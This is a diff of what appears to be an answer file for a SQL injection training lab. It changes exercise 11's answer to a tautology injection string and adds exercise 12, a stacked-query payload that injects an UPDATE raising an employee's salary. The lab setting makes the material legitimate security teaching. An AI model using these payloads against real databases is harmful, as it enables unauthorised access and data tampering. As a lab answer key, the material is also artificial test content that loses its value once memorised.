@@ -78,8 +78,16 @@ or
 ### 11
 
 ```
-1
-'1' or true = true
+'" or true = true or '1' = '"
+3SL99A
+```
+
+
+### 12
+
+```
+Smith
+3SL99A'; update employees SET salary = 90000 where first_name = 'John' and last_name = 'Smith 
 ```
 
 
